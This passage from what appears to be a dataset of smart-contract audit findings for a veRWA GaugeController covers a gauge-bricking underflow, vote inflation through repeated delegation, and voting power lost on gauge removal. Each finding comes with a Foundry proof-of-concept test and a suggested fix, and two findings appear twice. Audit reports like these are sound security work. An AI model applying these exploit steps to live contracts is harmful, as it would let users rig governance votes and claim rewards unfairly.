     // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation",

Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation",
